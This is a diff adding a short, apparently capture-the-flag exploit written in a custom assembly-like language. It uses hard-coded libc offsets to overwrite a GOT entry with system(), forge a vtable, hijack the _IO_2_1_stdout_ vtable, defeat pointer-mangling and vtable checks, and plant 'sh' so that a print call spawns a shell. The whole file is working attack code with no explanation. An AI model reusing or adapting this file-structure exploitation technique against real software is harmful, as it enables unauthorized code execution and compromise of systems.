@@ -1,0 +1,60 @@
+# offset between leak and libc base = 0x3e02ff0
+
+# offset from initial esp
+%define LIBC_START_OFFSET 0x3e03ff0
+# offsets from libc start
+%define OVERWRITE_TARGET_OFFSET 0x219040
+%define SYSTEM_OFFSET 0x50d60
+%define SYSTEM_ARGUMENT_OVERWRITE_OFFSET 0x21a7a8
+%define STDOUT 0x21a780
+%define SH 0x006873
+%define _IO_VTABLE_CHECK 0x89f70
+%define FS_30_OFFSET 0x2890
+
+start:
+    mov ebp, esp
+    add esp, LIBC_START_OFFSET
+    mov eax, esp
+    add esp, OVERWRITE_TARGET_OFFSET # overwite gots from beginning, and use the first where segfault
+    add eax, SYSTEM_OFFSET
+    add esp, 4
+    push eax # overwrite got target with system address
+
+create_fake_vtable:
+    mov esp, ebp
+    mov edi, esp
+    mov eax, esp
+    add eax, LIBC_START_OFFSET
+    add eax, SYSTEM_OFFSET
+    add esp, 64
+    push 0x7fff
+    push eax
+
+overwrite_stdout_vtable:
+    mov esp, ebp
+    add esp, LIBC_START_OFFSET
+    add esp, STDOUT
+    add esp, 220 # sizeof(_IO_2_1_stdout_ + 216) = *vtable
+    mov eax, edi # edi holds the fake vtable address
+    push eax # overwrite _IO_2_1_stdout_ vtable
+
+bypass:
+    mov esp, ebp
+    add esp, LIBC_START_OFFSET
+    mov edi, esp
+    sub esp, FS_30_OFFSET # bypass PTR_DEMANGLE (flag);
+    add esp, 8
+    add edi, _IO_VTABLE_CHECK
+    push 0x7fff
+    push edi
+
+overwrite_stdout_flags:
+    mov esp, ebp
+    add esp, LIBC_START_OFFSET
+    add esp, STDOUT # system takes *stdout as argument
+    add esp, 8
+    push 0
+    push SH
+
+trigger:
+    prn r10
